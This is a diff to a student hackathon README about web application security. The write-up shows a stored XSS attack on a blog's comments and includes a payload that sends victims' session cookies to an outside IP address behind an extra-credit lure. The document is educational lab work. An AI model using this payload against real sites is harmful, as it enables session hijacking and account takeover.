@@ -26,7 +26,8 @@ Link to Hackathon3 code : [https://github.com/SruthiAelay/waph-bopparsr/tree/mai
 The attacker's goal is to inject malicious JavaScript code into the blog application’s comments section. This code is designed to steal session cookies from any victim who interacts with the malicious comment, typically by clicking on a link or simply viewing the comment if the site renders the JavaScript automatically.This is done by posting a commment with embedded JavaScript code such as
 Code:
 ```
-<a onclick="window.location='http://192.167.9.51/?cookie='+document.cookie"> Click here! </a> To get 10% extra Credit!!! Offer is valid to limited time only!
+<a onclick="window.location='http://192.167.9.51/?cookie='+document.cookie"> Click here! </a>
+To get 10% extra Credit!!! Offer is valid to limited time only!
 ```
 
 ![Injecting javascript code ](Images/Step1.png)
@@ -74,8 +75,8 @@ Inadequate Use of ORM Tools: Properly configured Object Relational Mapping (ORM)
 
 Insufficient Testing and Security Practices: An application that has shown vulnerabilities (like the session hijacking vulnerability exploited earlier) might indicate a broader lack of security practices, including insufficient testing for SQL injection vulnerabilities.
 
-Link to Video:
-[Step 4 and 5 Demo](https://mailuc-my.sharepoint.com/:v:/g/personal/bopparsr_mail_uc_edu/Ea53-ZwFLtpBkTIiA7yFKR8B5C2LFJ97UXaEX6j0yr1foA?e=e8aI2M&nav=eyJyZWZlcnJhbEluZm8iOnsicmVmZXJyYWxBcHAiOiJTdHJlYW1XZWJBcHAiLCJyZWZlcnJhbFZpZXciOiJTaGFyZURpYWxvZy1MaW5rIiwicmVmZXJyYWxBcHBQbGF0Zm9ybSI6IldlYiIsInJlZmVycmFsTW9kZSI6InZpZXcifX0%3D)
+## Link to Video:
+[Click to view Step 4 and 5 Demo](https://mailuc-my.sharepoint.com/:v:/g/personal/bopparsr_mail_uc_edu/Ea53-ZwFLtpBkTIiA7yFKR8B5C2LFJ97UXaEX6j0yr1foA?e=e8aI2M&nav=eyJyZWZlcnJhbEluZm8iOnsicmVmZXJyYWxBcHAiOiJTdHJlYW1XZWJBcHAiLCJyZWZlcnJhbFZpZXciOiJTaGFyZURpYWxvZy1MaW5rIiwicmVmZXJyYWxBcHBQbGF0Zm9ybSI6IldlYiIsInJlZmVycmFsTW9kZSI6InZpZXcifX0%3D)
 
 ## Part II: Understanding and Prevention
 
